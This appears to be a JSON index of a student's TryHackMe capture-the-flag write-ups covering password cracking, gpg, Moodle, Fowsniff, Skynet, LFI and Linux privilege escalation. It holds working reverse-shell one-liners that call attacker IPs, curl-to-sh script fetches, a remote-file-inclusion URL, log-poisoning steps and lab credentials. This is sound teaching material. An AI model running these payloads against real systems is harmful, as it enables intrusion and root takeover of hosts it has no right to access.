0:00:00:00 DONE (2020-12-12 04:10) 50.00g/s 25600p/s 25600c/s 25600C/s fuckyou1..letmein Use the \u0026#34;--show --format=Raw-SHA1\u0026#34; options to display all of the cracked passwords reliably Session completed   Decoding base64 What is the name of the tool which allows us to decode base64 strings?\n base64\n Find a file called encoded.txt.\nWhat is the special answer?\n\n Because of the last character we know the file is base64 encoded Decode the file:  1  cat \u0026#34;/home/sarah/system AB/managed/encoded.txt\u0026#34; | base64 -d \u0026gt; decoded.txt   \n Search for \u0026lsquo;special\u0026rsquo;: /special  \n\n\n\n1 2 3 4 5 6 7 8 9  john --format=raw-md4 --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD4 [MD4 128/128 AVX 4x3]) Warning: no OpenMP support for this hash type, consider --fork=2 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status john (?) 1g 0:00:00:00 DONE (2020-12-12 04:48) 14.28g/s 98742p/s 98742c/s 98742C/s oblivion..better Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Encryption/Decryption using gpg Now try it for yourself. Make a random text file and enter some readable sentences in there before encrypting and decrypting it as illustrated above.\n1 2 3  touch test.txt echo \u0026#39;Make a random text file and enter some readable sentences in\u0026#39; \u0026gt;\u0026gt; test.txt gpg --cipher-algo AES-256 --symmetric test.txt   You wish to encrypt a file called history_logs.txt using the AES-128 scheme.\nWhat is the full command to do this?\n1  gpg --cipher-algo AES-128 --symetric history_logs.txt   What is the command to decrypt the file you just encrypted?\n1  gpg history_logs.txt.gpg   Find an encrypted file called layer4.txt, its password is bob.\nUse this to locate the flag.\nWhat is the flag?\n\n\n\n. . .\n\n. . .\n\n1  echo \u0026#34;MS4gRmluZCBhIGZpbGUgY2FsbGVkIGxheWVyMS50eHQsIGl0cyBwYXNzd29yZCBpcyBoYWNrZWQu\u0026#34; | base64 -d   Find a file called layer1.txt, its password is hacked.\n\nCracking encrypted gpg files Encrypt a file and use a common password contained in the wordlist you wish to use.\nFollow the instructions above to decrypt as if you are a hacker.\nIf it worked, well done.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  touch secret.txt echo \u0026#34;Secret message\u0026#34; \u0026gt;\u0026gt; secret.txt gpg --cipher-algo AES-256 --symmetric secret.txt gpg2john secret.txt.gpg \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [...]) is 2 for all loaded hashes Cost 3 (cipher algorithm [...]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status password (?) 1g 0:00:00:00 DONE (2020-12-15 04:17) 1.785g/s 7.142p/s 7.142c/s 7.142C/s 123456789..password Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   Find an encrypted file called personal.txt.gpg and find a wordlist called data.txt.\nUse tac to reverse the wordlist before brute-forcing it against the encrypted file.\nWhat is the the password to the encrypted file?\n1 2 3 4 5 6 7 8 9  type f -name personal.txt.gpg 2\u0026gt;\u0026gt;/dev/null /home/sarah/oldLogs/units/personal.txt.gpg find / -type f -name data.txt 2\u0026gt;\u0026gt;/dev/null /home/sarah/logs/zmn/old stuff/-mvLp/data.txt tac \u0026#34;/home/sarah/logs/zmn/old stuff/-mvLp/data.txt\u0026#34; \u0026gt; reverse.txt python3 -m http.server 8080    In the browser on your machine navigate to: {MACHINE IP}:8080/  \n Download personal.txt.gpg and reverse.txt  1 2 3 4 5 6 7 8 9 10 11 12 13 14  gpg2john personal.txt.gpg \u0026gt; hash john --wordlist=reverse.txt --format=gpg hash Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 65011712 for all loaded hashes Cost 2 (hash algorithm [...]) is 2 for all loaded hashes Cost 3 (cipher algorithm [...]) is 9 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status valamanezivonia (?) 1g 0:00:02:34 DONE (2020-12-15 04:59) 0.006485g/s 7.796p/s 7.796c/s 7.796C/s vigliacca..valamanezivonia Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   What is written in this now decrypted file?\n1  gpg --decrypt personal.txt.gpg   \nReading SQL databases Useful commands:\n1 2  service mysql start/stop mysql -u [username] -p -h [host ip]   Open SQL database file locally:\n1 2  mysql -u [username] -p source [sql filename]   Displaying the databases:\n1  SHOW DATABASES;   Choosing a database to view:\n1  USE [database name]   Displaying the tables in the selected database:\n1  SHOW TABLES;   View the table structure of individual table:\n1  DESCRIBE [table name]   Displaying all the data stored in a specific table:\n1  SELECT * FROM [table name]   Find a file called employees.sql and read the SQL database.\nFind the flag contained in one of the tables.\nWhat is the flag?\n1 2 3 4 5 6 7 8 9  find / -type f -name employees.sql 2\u0026gt;\u0026gt;/dev/null /home/sarah/serverLx/employees.sql cd \u0026#34;/home/sarah/serverLx/\u0026#34; mysql -u sarah -p sarah:password source employees.sql    HINT: Look for someone with the first name of: Lobel  1  SELECT * FROM employees WHERE first_name=\u0026#39;Lobel\u0026#39;;   \nFinal Challenge Go to the /home/shared/chatlogs directory and read the first chat log named: LpnQ.\nUse this to help you to proceed to the next task.\nNext chatlog:\n\nAnother one:\n\nWhat is Sameer\u0026rsquo;s SSH password?\n (screenshots of the three found chatlogs)\nWhat is the password for the sql database back-up copy?\n1 2 3 4 5  cd /home/shared/sql/conf/ find . -type f -size 50M ./JKpN less JKpN   \n1 2  cat pLmjwi LmqAQl Ulpsmt \u0026gt; passwords python3 -m http.server 8080   Download passwords file.\nUse less to view the file and search for words starting with \u0026lsquo;ebq\u0026rsquo;.\nTry different one to see which one is the correct one for the sql database.\n\nFind the SSH password of the user James.\nWhat is the password?\n1  cd /home/shared/sql   \n1 2  gpg --decrypt 2020-08-13.zip.gpg \u0026gt; backup.zip unzip backup.zip   \nSSH as james and change the user to root.\nWhat is the root flag?\n\n","description":"Guided room for beginners to learn/reinforce linux command line skills.","id":17,"section":"posts","tags":["command line","hash cracking","decoding","gpg","sql","privilege escalation"],"title":"Linux Strength Training [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/linux-strength-training/"},{"content":"   Title Anthem     Info Exploit a Windows machine in this beginner level challenge.   Difficulty Easy    Website Analysis Let\u0026rsquo;s run nmap and check what ports are open.\nWhat port is for the web server?\n\nWhat port is for remote desktop service?\n\nWhat is a possible password in one of the pages web crawlers check for?\n\nWhat CMS is the website using?\n\nWhat is the domain of the website?\n\nWhat\u0026rsquo;s the name of the Administrator?\n\n\nCan we find find the email address of the administrator?\n\nSpot the Flags What is flag 1?\n\nWhat is flag 2?\n\nWhat is flag 3?\n\nWhat is flag 4?\n\nFinal Stage Let\u0026rsquo;s get into the box using the intel we gathered.\nLet\u0026rsquo;s figure out the username and password to log in to the box.\n SH:UmbracoIsTheBest!\n Gain initial access to the machine, what is the contents of user.txt?\n\nCan we spot the admin password?\n\n\n\n\nEscalate your privileges to root, what is the contents of root.txt?\n\n","description":"Exploit a Windows machine in this beginner level challenge.","id":18,"section":"posts","tags":["enumeration","cms"],"title":"Anthem [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/anthem/"},{"content":"   Title Ignite     Info A new start-up has a few issues with their web server.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \nReconnaissance \n\nGaining Access fuelCMS Exploitation \n\n\n\n\nPrivilege Escalation \n\n\n\n","description":"A new start-up has a few issues with their web server.","id":19,"section":"posts","tags":["enumeration","cms","privilege escalation"],"title":"Ignite [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/ignite/"},{"content":"   Title GoldenEye     Info Bond, James Bond. A guided CTF.   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap Use nmap to scan the network for all ports.\nHow many ports are open?\n\nWebsite Take a look on the website, take a dive into the source code too and remember to inspect all scripts!\nWho needs to make sure they update their default password?\n\nPressing F12 in the Firefox broswer we can access Developer Tools.\n\nWhats their password?\n\nNow go use those credentials and login to a part of the site.\n boris:InvincibleHack3rInvincibleHack3r\n \n\nPOP3 Take a look at some of the other services you found using your nmap scan.\nAre the credentials you have re-usable?\n\nIf those creds don\u0026rsquo;t seem to work, can you use another program to find other users and passwords?\nMaybe Hydra? Whats their new password?\n  natalya:bird\n   boris:secret1!\n Inspect port 55007, what services is configured to use this port?\n POP3 is running on port 55007.\nWe can connect to the service using telnet\n Login using that service and the credentials you found earlier.\nWhat can you find on this service?\n emails\n What user can break Boris' codes?\n natalya\n Telnet Using the users you found on this service, find other users passwords.\n\n\nKeep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.\nGaining Access If you remembered in some of the emails you discovered, there is the severnaya-station.com website.\nTo get this working, you need up update your DNS records to reveal it.\nOn Linux edit your \u0026ldquo;/etc/hosts\u0026rdquo; file and add:\nsevernaya-station.com\nOn Windows do the same but in the \u0026ldquo;c:\\Windows\\System32\\Drivers\\etc\\hosts\u0026rdquo; file\nOnce you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir\nTry using the credentials you found earlier.\nWhich user can you login as?\n  xenia:RCP90rulez!\n Have a poke around the site.\nWhat other user can you find?\n\nWhat was this users password?\n\n doak:goat\n Use this users credentials to go through all the services you have found to reveal more emails.\nWhat is the next user you can find from doak?\nWhat is this users password?\n\nTake a look at their files on the moodle (severnaya-station.com)\n\nDownload the attachments and see if there are any hidden messages inside them?\n\n\n\n admin:xWinter1995x!\n Using the information you found in the last task, login with the newly found user.\n\nReverse Shell As this user has more site privileges, you are able to edit the moodles settings.\nFrom here get a reverse shell using python and netcat.\nTake a look into Aspell, the spell checker plugin.\nSettings-\u0026gt;Aspell-\u0026gt;Path to aspell\n\nPython shell:\n1 2 3  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;10.9.140.180\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;    Navigation \u0026gt; My profile \u0026gt; Blogs \u0026gt; Add a new entry\nclik on the “Toggle spell checker”\n\nPrivilege Escalation Download the linuxprivchecker to enumerate installed development tools.\nhttps://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123\nTo get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet.\nFollow the steps to get a file onto your VM:\nDownload the linuxprivchecker file locally\nNavigate to the file on your file system\n1 2  python -m SimpleHTTPServer 1337 wget \u0026lt;your IP\u0026gt;/\u0026lt;file\u0026gt;.py   \n\nWhats the kernel version?\n\nThis machine is vulnerable to the overlayfs exploit.\nThe exploitation is technically very simple:\n Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags. Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory. Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem. Make su on overlayfs world writable without changing the owner Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit. Execute the modified su binary You can download the exploit from here: https://www.exploit-db.com/exploits/37292  \n\n\nFix the exploit to work with the system you\u0026rsquo;re trying to exploit.\nRemember, enumeration is your key!\nWhat development tools are installed on the machine?\nwhich cc\n/usr/bin/cc\n\n\n\nRoot Flag \n\n","description":"Bond, James Bond. A guided CTF.","id":20,"section":"posts","tags":["enumeration","decoding","telnet","pop3","brute force","python","exploitation","privilege escalation"],"title":"GoldenEye [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/goldeneye/"},{"content":"   Title LFI Basics     Info Learn the basics of local file inclusion   Difficulty N\\A    Local File Inclusion LFI is a vulnerability which an attacker can exploit to include/read files.\nThis vulnerability occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.\nPossible impact:\n Denial of service Remote code execution Sensitive information disclosure  \n\n\n\nPiece of vulnerable code:\n1  $local_file = $_REQUEST[\u0026#34;page\u0026#34;];   LFI using Directory Traversal Directory traversal or Path Traversal is an HTTP attack which allows attackers to access restricted directories and execute commands outside of the web server’s root directory or other paths.\n\nPiece of vulnerable code:\n1  $local_file = \u0026#34;html/\u0026#34;.$_REQUEST[\u0026#34;page\u0026#34;];   RCE using LFI and log poisoning Log Poisoning is a common technique used to gain a reverse shell from a LFI vulnerability.\nTo make it work an attacker attempts to inject malicious input to the server log.\nApache log file with ability to use log poisoning:\n\nTry reading the apache log file:\n\n\nIntercept the request and insert the following malicious code in the user agent field.\nThe PHP command will allow us to execute system commands by parsing the input to a GET parameter called lfi:\n\nForward the request and add your parameter to the link.\nThe link becomes: http:///lfi/lfi.php?page=/var/log/apache2/access.log\u0026amp;lfi=\nExecute commands on the system.\nCollection of information regarding LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion\n","description":"Learn the basics of local file inclusion","id":21,"section":"posts","tags":["lfi","log poisoning"],"title":"LFI Basics [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/lfi-basics/"},{"content":"   Title Fowsniff CTF     Info Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap Using nmap, scan this machine. What ports are open?\nUsing the information from the open ports. Look around. What can you find?\n\nPOP3 Using Google, can you find any public information about them?\nhttps://pastebin.com/NrAqVeeX\n\nCan you decode these md5 hashes?\n\n\n\nUsing the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?\n\n\n\n\n\n. . .\n\nOr we can use Hydra\n\nWhat was seina\u0026rsquo;s password to the email service?\n seina:scoobydoo2\n Can you connect to the pop3 service with her credentials? What email information can you gather?\n\nLooking through her emails, what was a temporary password set for her?\n\n\n. . .\n\nGaining Access In the email, who send it?\nUsing the password from the previous question and the senders username, connect to the machine using SSH.\n\n\nOnce connected, what groups does this user belong to? Are there any interesting files that can be run by that group?\n\n\nPrivilege Escalation Banner Exploitation Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?\nPython Reverse Shell:\n1  python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026lt;IP\u0026gt;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp).\nLook in /etc/update-motd.d/ file.\nIf (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!\n\nStart a netcat listener (nc -lvp 1234) and then re-login to the SSH service.\nYou will then receive a reverse shell on your netcat session as root!\n\n","description":"Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!","id":22,"section":"posts","tags":["enumeration","exploitation","pop3","brute force","python","metasploit"],"title":"Fowsniff CTF [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/fowsniff-ctf/"},{"content":"   Title Skynet     Info A vulnerable Terminator themed Linux machine.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \n\nDirectory Brute-Forcing \n\nSamba \n\n\n\n\nAccessing Webmail \n\n\nFurther Enumeration \n\n\n\nGaining Access Cuppa CMS Exploitation \n\nhttps://www.exploit-db.com/exploits/25971\n http://10.10.201.252/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.140.180:8888/php-reverse-shell.php\n \n\nPrivilege Escalation \n\n https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/\n \n\n\n\n\n","description":"A vulnerable Terminator themed Linux machine.","id":23,"section":"posts","tags":["enumeration","smb","cms","cron"],"title":"Skynet [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/skynet/"},{"content":"   Title Brute It     Info Learn how to brute, hash cracking and escalate privileges in this box!   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap \nDirectory Brute-Forcing \n\nNote found in the source code.\n\nBrute-Forcing SSH credentials \n\n\nSave RSA PRIVATE KEY into admin_id_rsa file and convert it for john.\nThen crack the passphrase.\n\n\nGaining Access User flag \nPrivilege Escalation \nUser John is able to run cat command as root.\nRead shadow file and crack the root\u0026rsquo;s password with john on your local machine.\n\n\nRoot flag \n","description":"Learn how to brute, hash cracking and escalate privileges in this box!","id":24,"section":"posts","tags":["brute force","hash cracking","privilege escalation"],"title":"Brute It [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/brute-it/"},{"content":"   Title Linux Local Enumeration     Info Learn to efficiently enumerate a linux machine and identify possible weaknesses.   Difficulty N\\A    Lab Setup  Upload PHP reverse shell on {MACHINE IP}:3000 Start netcat listener: nc -lnvp 1234  \n Execute: bash -c \u0026lsquo;bash -i \u0026gt;\u0026amp; /dev/tcp/{LOCAL MACHINE IP}/1234 0\u0026gt;\u0026amp;1\u0026rsquo; Now we have a shell:  \nStabilizing the shell TTY 1  python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;   List of static binaries you can get on the system:\nhttps://github.com/andrew-d/static-binaries\nUpgrading to TTY:\nhttps://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys\nHow would you execute /bin/bash with perl?\n perl -e \u0026lsquo;exec \u0026ldquo;/bin/bash\u0026rdquo;;\u0026rsquo;\n SSH  In case if the tagert machine does not have a generated id_rsa file (or we don\u0026rsquo;t have reading permissions for it), we can still gain stable ssh access. We need to generate our own id_rsa key on our system and include an associated key into authorized_keys file on the target machine. Execute ssh-keygen and we should see id_rsa and id_rsa.pub files appear in our own .ssh folder. Copy the content of the id_rsa.pub file and put it inside the authorized_key file on the target machine. Now we can connect to the target machine using your id_rsa file.  Where can you usually find the id_rsa file?\n /home/user/.ssh/id_rsa\n Basic enumaration How would you print machine hardware name only?\n uname -m\n Where can you find bash history?\n ~/.bash_history\n https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Bash-History-Facilities\nWhat\u0026rsquo;s the flag?\n\n/etc Central location for all your configuration files.\nRead the /etc/passwd file by running cat /etc/passwd\n goldfish: x:1003:1003:,,,:/home/goldfish:/bin/bash\n    Value Meaning     (goldfish) - Username    (x) - Password: Character \u0026ldquo;x\u0026rdquo; indicates that an encrypted account password is stored in /etc/shadow file   (1003) - User ID (UID): Each non-root user has his own UID (1-99). UID 0 is reserved for root.   (1003) - Group ID (GID): Linux group ID   (,,,) - User ID Info: A field that contains additional info (,,, means any user additional info)   (/home/goldfish) - Home directory: A path to user\u0026rsquo;s home directory that contains all the files related to them.   (/bin/bash) - Shell or a command: Path of a command or shell that is used by the user. Services run on /usr/sbin/nologin.    If we have writing access to the /etc/passwd, we can easily get root creating a custom entry with root privelege:\rhttps://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/\rUse /etc/shadow to retrieve different user passwords:\n goldfish:$6$1FiLdnFwTwNWAqYN$WAdBGfhpwSA4y5CHGO0F2eeJpfMJAMWf6MHg7pHGaHKmrkeYdVN7fD.AQ9nptLkN7JYvJyQrfMcfmCHK34S.a/:18483:0:99999:7:::\n    Value Meaning     (goldfish) - Username    ($6$1FiLdnFwT\u0026hellip;) - Password: Encrypted password.   (18483) - Last password change: Days since Jan 1, 1970 that password was last changed.   (0) - Minimum: The min number of days required between pass changes (Zero: pass can be changed immidiately).   (99999) - Maximum: The maximum number of days the password is valid.   (7) - Warn: The number of days before the user will be warned about changing their password.    If we have reading permissions for this file, we can crack the encrypted password using one of the cracking methods. Important files Find command and interesting files\nWhat\u0026rsquo;s the password you found?\n\nDid you find a flag?\nfind / -type f -name \u0026ldquo;*.conf\u0026rdquo; 2\u0026gt;/dev/null\n\nSUID Find all SUID file by executing this simple find command:\n1  find / -perm -u=s -type f 2\u0026gt;/dev/null   -u=s searches files that are owned by the root user\n-type f search for files, not directories\nWhich SUID binary has a way to escalate your privileges on the box?\n\nWhat\u0026rsquo;s the payload you can use to read /etc/shadow with this SUID?\n grep /etc/shadow\nhttps://gtfobins.github.io/gtfobins/grep/#suid\n Enumeration scripts Linpeas  Linux local Privilege Escalation Awesome Script is a script that searches for possible paths to escalate privileges on Linux/ hosts. It automatically searches for passwords, SUID files and Sudo right abuse to hint you on your way towards root.  Local Machine:\r```bash\rwget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh\rpython3 -m http.server 8000\r```\rTarget Machine:\n1  curl {OUR MACHINE IP}:8000/linpeas.sh | sh   LinEnum  It performs Scripted Local Linux Enumeration \u0026amp; Privilege Escalation Checks  Local Machine:\r```bash\rwget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\rpython3 -m http.server 8000\r```\rTarget Machine:\n1  curl {OUR MACHINE IP}:8000/LinEnum.sh | sh   ","description":"Learn to efficiently enumerate a linux machine and identify possible weaknesses.","id":25,"section":"posts","tags":["enumaration","shell stabilization","enumeration scripts"],"title":"Linux Local Enumeration [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/linux-local-enumeration/"},{"content":"   Title Startup     Info Abuse traditional vulnerabilities via untraditional means.   Difficulty Easy    Reconnaissance \nScanning \u0026amp; Enumeration Nmap \nFTP \nDirectory Brute-Forcing \n\n\nGaining Access \n\n\n\n\n\n\n\n\n\n\nPrivilege Escalation \n\n\n\n\n\n\n","description":"Abuse traditional vulnerabilities via untraditional means.","id":26,"section":"posts","tags":["enumeration","ftp","cron","privilege escalation"],"title":"Startup [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/startup/"},{"content":"   Title Sudo Security Bypass     Info A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series.   Difficulty N\\A    Security Bypass CVE-2019-14287\n It is a vulnerability found in the Unix Sudo program. This exploit has been fixed, but may still be present in older versions of Sudo (versions \u0026lt; 1.8.28). Manually choose to execute sudo as another user: sudo -u#  sudo can be configured by editing a configuration file called /etc/sudoers Safely edit with the command sudo visudo, which checks when you\u0026rsquo;re saving to ensure that there are no misconfigurations\n   ALL=(ALL:!root) NOPASSWD: ALL\n  Added in the sudoers file, granting user extra permision but not executing as root.\n  If you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (root).\n  Execute a command as root, despite being explicitly prevented from doing so.\n  This will only works if you\u0026rsquo;ve been granted non-root sudo permissions for the command.\n   What command are you allowed to run with sudo?\n\nWhat is the flag in /root/root.txt?\n\n ","description":"A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series.","id":27,"section":"posts","tags":["exploit"],"title":"Sudo Security Bypass [TryHackMe]","uri":"https://martinkubecka.github.io/en/posts/thm/sudo-security-bypass/"},{"content":"Hi, I am Martin. I am a Computer Science student from Slovakia pursuing bachelor\u0026rsquo;s degree at Slovak University of Technology in Bratislava. My main interest is in the Penetration Testing, Cyber Defense, Open-Source Intelligence Techniques and Social Engineering.\nI chose Junior Penetration Tester by eLearnSecurity as my first certification because it is a practical scenario-based exam. At the beginning of February 2021, I successfully passed the exam, and I was granted this certification.\nMainly I have gained knowledge and hands-on experience on the online platform TryHackMe which teaches cyber security through real-world labs. Feel free to visit my profile and do not miss the shining badges under the Completed Rooms section.\nNowadays I am working through Simulation-Based Training Program by RangeForce focused on obtaining live-environment experience with the foundational concepts and practices of a security operations center.\nThrough this website, I help other self-studying cyber security students in developing methodology used in basic penetration testing and vulnerability assessment.\nApart from cyber security, I have been writing my own songs since 2013. Beside that I like to listen to music, read books and also, I like cycling.\nThank you for visiting my page. I hope you like the content. Martin Kubecka\n","description":"","id":28,"section":"","tags":null,"title":"About","uri":"https://martinkubecka.github.io/en/about/"}]